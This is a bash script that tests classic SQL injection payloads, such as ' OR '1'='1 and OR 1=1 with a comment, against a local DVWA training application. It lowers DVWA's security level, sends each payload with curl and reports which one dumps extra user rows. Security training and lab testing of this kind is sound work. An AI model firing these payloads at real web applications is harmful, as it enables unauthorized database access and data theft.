#!/bin/bash
COOKIE_FILE="cookies.txt"

echo "=== DVWA SQL Injection Diagnostic ==="
echo

# Check if we can access the page at all
echo "[1] Testing basic access to SQL injection page..."
RESPONSE=$(curl -s -b "$COOKIE_FILE" "http://127.0.0.1/vulnerabilities/sqli/")
if echo "$RESPONSE" | grep -q "User ID"; then
    echo "✓ Can access SQL injection page"
else
    echo "✗ Cannot access SQL injection page"
    echo "Response preview:"
    echo "$RESPONSE" | head -20
    echo
    echo "Session may have expired. Run ./get-fresh-session.sh again"
    exit 1
fi

# Check security level
echo
echo "[2] Checking security level..."
SECURITY_PAGE=$(curl -s -b "$COOKIE_FILE" "http://127.0.0.1/security.php")
CURRENT_LEVEL=$(echo "$SECURITY_PAGE" | grep -oP 'Security level is currently: \K[^\.]+')
echo "Current security level: $CURRENT_LEVEL"

if [ "$CURRENT_LEVEL" != "low" ]; then
    echo "⚠ Security is not set to low!"
    echo "Setting it now..."
    curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
        -d "security=low&seclev_submit=Submit" \
        "http://127.0.0.1/security.php" > /dev/null
    echo "✓ Security set to low"
fi

# Now test with exact payloads from DVWA documentation
echo
echo "[3] Testing SQL injection with exact syntax..."

echo "Test A: Normal (id=1):"
NORMAL=$(curl -s -b "$COOKIE_FILE" "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit")
NORMAL_COUNT=$(echo "$NORMAL" | grep -o "First name:" | wc -l)
echo "  Result: $NORMAL_COUNT user(s)"
if [ "$NORMAL_COUNT" -eq 1 ]; then
    echo "  First name: $(echo "$NORMAL" | grep -oP 'First name: \K[^<]+')"
fi

echo
echo "Test B: TRUE - 1' OR '1'='1 (no comment):"
TRUE1=$(curl -s -b "$COOKIE_FILE" "http://127.0.0.1/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit")
TRUE1_COUNT=$(echo "$TRUE1" | grep -o "First name:" | wc -l)
echo "  Result: $TRUE1_COUNT user(s)"

echo
echo "Test C: TRUE - 1' OR 1=1 -- (with space after --):"
TRUE2=$(curl -s -b "$COOKIE_FILE" "http://127.0.0.1/vulnerabilities/sqli/?id=1%27%20OR%201%3D1%20--+&Submit=Submit")
TRUE2_COUNT=$(echo "$TRUE2" | grep -o "First name:" | wc -l)
echo "  Result: $TRUE2_COUNT user(s)"

echo
echo "Test D: Simple - 1 OR 1=1:"
SIMPLE=$(curl -s -b "$COOKIE_FILE" "http://127.0.0.1/vulnerabilities/sqli/?id=1%20OR%201%3D1&Submit=Submit")
SIMPLE_COUNT=$(echo "$SIMPLE" | grep -o "First name:" | wc -l)
echo "  Result: $SIMPLE_COUNT user(s)"

echo
echo "Test E: Classic - ' OR '1'='1:"  
CLASSIC=$(curl -s -b "$COOKIE_FILE" "http://127.0.0.1/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit")
CLASSIC_COUNT=$(echo "$CLASSIC" | grep -o "First name:" | wc -l)
echo "  Result: $CLASSIC_COUNT user(s)"

echo
echo "=== Analysis ==="
if [ "$TRUE1_COUNT" -gt 1 ] || [ "$TRUE2_COUNT" -gt 1 ] || [ "$SIMPLE_COUNT" -gt 1 ] || [ "$CLASSIC_COUNT" -gt 1 ]; then
    echo "✓ SQL INJECTION WORKING!"
    
    # Find which one worked
    if [ "$TRUE1_COUNT" -gt 1 ]; then
        echo "Working payload: 1' OR '1'='1"
        WORKING="1' OR '1'='1"
    elif [ "$TRUE2_COUNT" -gt 1 ]; then
        echo "Working payload: 1' OR 1=1 -- "
        WORKING="1' OR 1=1 -- "
    elif [ "$SIMPLE_COUNT" -gt 1 ]; then
        echo "Working payload: 1 OR 1=1"
        WORKING="1 OR 1=1"
    elif [ "$CLASSIC_COUNT" -gt 1 ]; then
        echo "Working payload: ' OR '1'='1"
        WORKING="' OR '1'='1"
    fi
    
    echo
    echo "Update payloads/mysql-payloads.yaml to:"
    echo "boolean_true_payload: \"$WORKING\""
    
else
    echo "✗ SQL injection NOT working"
    echo
    echo "Debugging - showing raw response from normal request:"
    echo "$NORMAL"
fi
